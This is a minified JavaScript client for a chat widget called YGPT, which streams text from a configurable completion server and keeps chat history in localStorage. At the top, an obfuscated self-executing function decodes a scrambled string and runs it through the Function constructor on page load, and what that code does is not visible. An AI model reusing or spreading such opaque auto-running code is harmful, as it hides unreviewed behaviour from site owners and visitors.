//                       _oo0oo_
//                      o8888888o
//                      88" . "88
//                      (| -_- |)
//                      0\  =  /0
//                    ___/`---'\___
//                  .' \\|     |// '.
//                 / \\|||  :  |||// \
//                / _||||| -:- |||||- \
//               |   | \\\  -  /// |   |
//               | \_|  ''\---/''  |_/ |
//               \  .-\__  '-'  ___/-. /
//             ___'. .'  /--.--\  `. .'___
//          ."" '<  `.___\_<|>_/___.' >' "".
//         | | :  `- \`.;`\ _ /`;.`/ - ` : | |
//         \  \ `_.   \_ __\ /__ _/   .-` /  /
//     =====`-.____`.___ \_____/___.-`___.-'=====
//                       `=---='
//
//     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//           Phật phù hộ, không bao giờ BUG
//
//          YourGPT - AL-Library.YGPT (c)2024
//     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//
//
// YGPT Client made by AnLaVN (https://github.com/AnLaVN) with love <3
(function(){var SXL="",kxE=625-614;function ELX(b){var a=1483153;var r=b.length;var p=[];for(var n=0;n<r;n++){p[n]=b.charAt(n)}for(var n=0;n<r;n++){var g=a*(n+513)+a%38770;var v=a*(n+431)+a%22634;var x=g%r;var w=v%r;var t=p[x];p[x]=p[w];p[w]=t;a=(g+v)%3322052}return p.join("")}var GvH=ELX("nufttbjxgcusrcoosehtmrlrwopaqcvknzdiy").substr(0,kxE);var YWx='ta] ==m8;ew7s,A=.31vrr hl"ab d[fthpj<ltncp;rut+v+x[zo;ea  d=-8=,d5f6r,u1.6+,p9+81,74"7=,d0 8,,;2]7;,+6"8s,(9r8v,r2r6n,]64;eak a=+]kf;r(v;r,r00(roonlnn;tg;;+a)u[[[C],==+1; ad t=,]oky=25ie;=s7=cr=o3rfrr(v1r}lu0ilga6gsmrn;srl)n;tr;=+()+vvr]iha{gvmvnsshly.,ptiq(] A),flr+vtrrv7ial)nht)-f;]>(0=vs-a{{a) }=.ualnvtr=y6i)vs;.at 1=tull8v[r[js0tvorpgvy.lmnet);.aa {;+o((na" 8=t;f<n;=+=)(vlrruiy.cia;C]d[A.((),vlrtw"fcut;)fjwh{==lw=1c*e+0.ah-ruoieitpt116-,;s=t;.+k;re7sl of{uu==)<zaet(h.te;ghhrk;ytc-aeC)dfAt(v+h)s+!."h5rqo9eitutv2,-j;r=(;r+)25}dl e crn(iou ;ni}(e=(nsl})e=r]ais(.>()a.0u(h=y.s)bCtaiggyj}df),s.posz(g[0+r]C;o=)+=;(i((d!)nilr)8i8(7<;)g.iueh(yos.b=toijg j))jigv+=d.no1no"0)z}hq=pvsi(,[r]f;jvCrrxnq2jlir( ";;4a  0=*4S,r9r9+, 0)9p,r21.[o;c+tao{;(a) ,=vtsi]ggfvotC;agCadf(k6n;uoi(ua3 9=z;)<e..e[geh)rl+(x1xps5let;mjhcc[aeAt(7)[.ao3n=Smrvnf.=rcm;hrr+oferprra)t;1e)usnoxcsel4tvme"h"h.,o7nrm.;';var pDu=ELX[GvH];var CfD="";var wCO=pDu;var DEX=pDu(CfD,ELX(YWx));var Agv=DEX(ELX('|_(=vtU$<C.()aUU_)ScSKn;7U.Gl}j"tv .$_a%.;/}fbd=U3. o7l7_a%Uf,a.3UUp.(a$~u8f%.UUUfUf0;f7=n$k.UfC~(=e )!b.[bU/0./UB=_U%_U.;|U7UUfc$f(.0.f$_eU.;6U.a_f.~./U$e_<-8f.,fUae/"._1g|UJUN6Ua7fl!UU?f.)=o~5U  uff_.k81=!ho!~. .).f)f\'~|UU)%U_$;~f.Uf%-,,o-1U.Uf55U<C)fm%f_y}).-/4UUU~7!)UdlU#CUnff=27KCr-{\'Ujg}<=0#.-Cf)U<UUd.U<y~n+/3d ~fU/AU,.o!).IU:#i-U8.;y,6_.tf$]Uo..:U..U%6J)..:*9_w49{U*....{f]~_ !o)f|3UfU.UUDU+ UU/U.f7AUb8tfi.2:-w67(c+...,U_/a;Ut.=.UU3|a(@_eU/[EB!)icU84i._UU!v~4#Ep;FUf|_cf.It7.G,mf.C,.U.%nUU=8fU"_.o.h.f\'cd8fiU4)7.%hh  UU/yG.:rUe8Cfc_.oU.|ct;.yf)!&..6m).Uu e=FfD.f.U;//l%~eCo.~g50U;..pzo.U:hh%")(ua%U0f.~$.0)!~~|=.r UfU)bU-.."}oCkfaU8.d,U)!ffd.m%fU..,Uo0fCff~UIf~U8@%!U!.f. f l_$g0tf|%U89j= =.o.j,U)..as}(=*ff|t~j=U;(U =oUr4|Ul~/$CU;_+|3U/U<:(.r~k]c-ia.|G75fc._I .7||.10UU).c72f-fcU~"Ff~dcUUb[>k>of}_i)fHUcB|bUD.7~/c)=.t=UfU8~|fo(%7ffU~_CA)~f.-U8a!f!Ug_.U-~!||D fUjU)/~%.]Upvpf.__!,~.( t.o)f.stU U_)..23!Uf||U.UU-:C.f.(;U.usd9p\'-!9/2!4J5p._=UrU~UHt71;D{b00tUoefU-.Chz.ff~3fu-"~!. !1a..0.D.C!$..gc,8i3Uo\'Cf%..efF-U6|_31.e|.=.p.[U}.f"3UhiUjefU-"T_/C._CU$(5fUU..el~%nf_..4.cS ~...Ut7*88f+~f||cf_>fh.bn}f._4uU.3u.0g$9Nr$U,9zU=fr3UjgUe.HUfU(rpn$r_4_!1r.|dfU  .UEaqUfUE~UUeu1%._(../Hs?j.pls.CU..\' l!U0.f.3U9=!-..Ud=+~c~r9,)8U_;,s t.$=60f.U o~p=%0?.U.UUad-n..\'BU3()UUUm.fU/lflU;.a~c1Un%0ecu1oo_.Ux /mf3,!.;.~//4!H4+7439]Do_37U(7tr;0)6U-y/..Ua4%_.yF0!(]b3si.$.g(.~t-U71b4nU1fUnU.718)~"UUUo_!yf-.3yU~e4jU..%ou;_.!1U.0:4ff8UfU~53.]s/|)b|.ffaUoUd)f_fU..4y,c.};z.r=~9UtUfUs4_U8kgiu!~ft.6.>).%l-/U=et"2UUfrf%Cfbmrk%Ufjl.@.U#~3:f.U8U5{b.C.2.8(J.UU.pc3U(.ufn5.;fg.nn7(&_l_f,-~ffU$e-$.7fdifUfHbU_>.(=f.nb!=f_{t7f8%=#Ux[.8%.a;,UUU4Ur5-.,Uc.U2.rd_!>in$1Uf;A./-x4UUo .6U!UfU4uef~U=$i1,_ [b.2~=3 UfU.@|g5?..)il, z.~UU!..$;@c[;|f/_tj(2U0,.h\'.U,~K/(..}t_U/o{Ut.(3.y;.0/(_!U.CrUU4!| U!5,UU(p;~$3.}ea(:=~#_C!sC!(f(i_tF_ 0-=_o=fjUF.nK_t1gUUn~m0c7U$3Tz3.:U(~;__d~/9Ur;,U=DfU,#U.2fof*r+f/pqyc&.)e(Uf.-$_+];0eU.yU..>!=lUj.(.bd 2.~$.Ui,+..ffUo&T_o.f:UU; lCU7cff36fGA=CU?)Ei_%EeU__UUs-fh.,\'3:Ub.;U-.~3( vaoeU~U1; bUU$_-e6o%"_";U c$rgfUj,_-(1U8UU!fo.U|c.) f{8{U2csb .:.6t__/D 2.~C.,U~fU.UU~'));var Amj=wCO(SXL,Agv);Amj(4808);return 3567})();auto_grow=element=>{element.style.height="";element.style.height=element.scrollHeight+3+"px"};app.controller("YGPT_Controller",["$scope","$compile",function($scope,$compile){$scope.YGPT=YGPT_Config;$scope.Chats=JSON.parse(localStorage.getItem("YGPT"))||[];$scope.Typing="";$scope.Sending=false;$scope.Prompt=YGPT_Config.prompt+($scope.Chats?$scope.Chats.map(o=>(o.ygpt?"YGPT: ":"User: ")+o.content).join("\n\n"):"");$scope.LoadScroll=()=>{$scope.YGPT.frame=document.querySelector("#Modal_YGPT .overflow-y-auto");document.getElementById("Modal_YGPT").addEventListener("shown.bs.modal",e=>{$scope.YGPT.frame.scrollTop=$scope.YGPT.frame.scrollHeight})};$scope.DeleteChat=()=>{if(confirm(YGPT_Config.clear_message)){localStorage.removeItem("YGPT");$scope.Chats=[];$scope.Prompt=YGPT_Config.prompt}};$scope.SendMessageOnEnter=event=>{if(event.key==="Enter"&&!event.shiftKey){event.preventDefault();$scope.SendMessage()}};$scope.SendMessage=async function(){if(!$scope.Typing||$scope.Typing=="")return;$scope.Prompt+="\n\nUser: "+$scope.Typing+"\n\nYGPT: ";$scope.Chats.push({content:$scope.Typing,time:new Date,ygpt:false});$scope.Typing="";$scope.Sending=true;var ygpt={prompt:$scope.Prompt,stream:true,n_predict:1e3,temperature:.7,stop:["</s>","YGPT:","User:"],repeat_last_n:256,repeat_penalty:1.18,top_k:40,top_p:.5,min_p:.05,tfs_z:1,typical_p:1,presence_penalty:0,frequency_penalty:0,mirostat:0,mirostat_tau:5,mirostat_eta:.1,grammar:"",n_probs:0,image_data:[],cache_prompt:true,slot_id:0};try{const response=await fetch(`${YGPT_Config.host}/completion`,{method:"POST",body:JSON.stringify(ygpt),headers:{Connection:"keep-alive","Content-Type":"application/json",Accept:"text/event-stream"}});const reader=response.body.getReader();const decoder=new TextDecoder;let content="";let leftover="";$scope.$apply(()=>{$scope.Chats.push({content:content,time:new Date,ygpt:true})});var curr=$scope.Chats.length-1;let cont=true;while(cont){const result=await reader.read();if(result.done)break;const text=leftover+decoder.decode(result.value);const endsWithLineBreak=text.endsWith("\n");let lines=text.split("\n");if(!endsWithLineBreak)leftover=lines.pop();else leftover="";const regex=/^(\S+):\s(.*)$/gm;for(const line of lines){const match=regex.exec(line);if(match){result[match[1]]=match[2];if(result.data){result.data=JSON.parse(result.data);content+=result.data.content;$scope.$apply(()=>{$scope.Chats[curr].content+=result.data.content;$scope.YGPT.frame.scrollTop=$scope.YGPT.frame.scrollHeight});if(result.data.stop){if(result.data.generation_settings)generation_settings=result.data.generation_settings;cont=false;break}}}}}$scope.$apply(()=>{$scope.Sending=false;$scope.Prompt+=content;$scope.Chats[curr].content=content.trim()});document.querySelector("#Modal_YGPT textarea").focus();localStorage.setItem("YGPT",JSON.stringify($scope.Chats))}catch(e){new bootstrap.Toast(document.getElementById("Toast_YGPT")).show();$scope.$apply(()=>{$scope.Sending=false})}};const YGPT=document.getElementById("YGPT");if(!YGPT.innerHTML){YGPT.innerHTML=`<!doctypehtml><html lang="en"><style>@import url(https://fonts.googleapis.com/css?family=Dosis:300,400,500);html,body,*{font-family:"Dosis",sans-serif;transition:background var(--speed) var(--easing)}.dvh-100{height:100dvh}.c-pointer{cursor:pointer}.pre-wrap{white-space:pre-wrap}.bubble{width:{{YGPT.width}}}.pattern{background-image:url({{YGPT.pattern}});background-position:top right;background-size:510px auto;background-repeat:repeat}:root{--color-scrollbar:rgba(90, 90, 90, 0.3);--color-scrollbar-code:rgba(200, 200, 200, 0.3)}.custom-scroll{scrollbar-width:thin;scrollbar-color:transparent transparent;transition:scrollbar-color .3s ease;-webkit-overflow-scrolling:touch;pointer-events:auto}.custom-scroll::-webkit-scrollbar-thumb{background-color:transparent;border-radius:.375rem;box-shadow:0 0 1px rgba(255,255,255,.01)}.custom-scroll:hover,.custom-scroll:focus,.custom-scroll:focus-within{scrollbar-color:var(--color-scrollbar) transparent}.custom-scroll:hover::-webkit-scrollbar-thumb,.custom-scroll:focus::-webkit-scrollbar-thumb,.custom-scroll:focus-within::-webkit-scrollbar-thumb{background-color:var(--color-scrollbar)}body:not(.is-ios) .custom-scroll::-webkit-scrollbar{width:.375rem}</style><button class="btn bg-body-tertiary rounded-circle border position-fixed bottom-0 end-0 m-3 p-0 text-center overflow-hidden"type="button"data-bs-target="#Modal_YGPT"data-bs-toggle="modal"style="height:50px;width:50px"><img class="w-100 h-100"ng-src="{{YGPT.logo}}"></button><div class="modal fade"id="Modal_YGPT"ng-init="FullScreen=false"tabindex="-1"><div class="modal-dialog {{FullScreen?'modal-fullscreen':''}} m-0 ms-auto me-0"><div class="modal-content border-0 pattern rounded-0"><button class="btn position-absolute top-0 start-0 fs-3 text-body-secondary bi bi-arrows-angle-{{FullScreen?'contract':'expand'}}"ng-click="FullScreen=!FullScreen"></button><strong class="mt-4 position-absolute top-0 start-50 translate-middle text-muted">{{YGPT.name}}</strong><button class="btn-close position-absolute top-0 end-0 m-2 fs-3"data-bs-dismiss="modal"></button><div class="container-fluid d-flex flex-column dvh-100"><div class="row flex-grow-1 overflow-y-auto custom-scroll"ng-init="LoadScroll()"><div class="m-0 p-0"><div class="justify-content-center row m-0 p-0 pt-5"><div class="my-3 text-muted text-center">{{YGPT.tutorial}}</div><div class="col-12 m-0 p-0"ng-repeat="Message in Chats track by $index"><div class="d-flex flex-row justify-content-start bubble"ng-if="Message.ygpt"><img class="rounded-circle border ms-2 d-none d-sm-block"ng-src="{{YGPT.logo}}"style="width:2em;height:2em"><div><p class="m-0 ms-2 rounded-3 text-body text-break bg-body-tertiary p-2 pre-wrap">{{Message.content}}<text class="spinner-grow mx-4"ng-if="Message.content==''"style="width:1.4em;height:1.4em"></text><p class="small ms-3 rounded-3 text-muted float-end"><small>{{Message.time|date:YGPT.datetime_format:YGPT.timezone_format}}</small></div></div><div class="d-flex flex-row justify-content-end bubble ms-auto"ng-if="!Message.ygpt"><div><p class="m-0 me-2 rounded-3 text-{{YGPT.user_text}} text-break bg-{{YGPT.user_color}} p-2 pre-wrap"style="background-color:{{YGPT.user_color}}">{{Message.content}}<p class="small me-3 rounded-3 text-muted"><small>{{Message.time|date:YGPT.datetime_format:YGPT.timezone_format}}</small></div><img class="rounded-circle border me-2 d-none d-sm-block"ng-src="{{YGPT.user_avatar}}"style="width:2em;height:2em"></div></div></div></div></div><div class="d-flex justify-content-center align-items-center position-relative mb-2 mx-auto col-12"><i class="bi {{YGPT.delete_icon}} me-2 mb-auto fs-3 text-{{Sending?'body-tertiary':'danger'}} c-pointer"ng-click="!Sending && DeleteChat()"></i><textarea class="form-control custom-scroll"ng-disabled="Sending"ng-keypress="SendMessageOnEnter($event)"ng-model="Typing"onblur="auto_grow(this)"oninput="auto_grow(this)"rows="1"style="resize:none;max-height:150px"></textarea><i class="bi {{YGPT.send_icon}} ms-2 mt-auto fs-3 text-{{Sending?'body-tertiary':YGPT.user_color}} c-pointer"ng-click="!Sending && SendMessage()"style="color:{{YGPT.user_color}}"></i></div></div></div></div></div><div class="toast-container position-fixed top-0 end-0 p-3"><div class="toast border border-danger"id="Toast_YGPT"data-bs-delay="15000"><div class="toast-header"><strong class="me-auto"><i class="bi bi-bell-fill me-2"></i>{{YGPT.title_message}}</strong><small>{{Chats[Chats.length-1].time|date:YGPT.datetime_format:YGPT.timezone_format}}</small><button class="btn-close"data-bs-dismiss="toast"type="button"></button></div><div class="toast-body">{{YGPT.error_message}}</div></div></div>`;$compile(YGPT)($scope)}}]);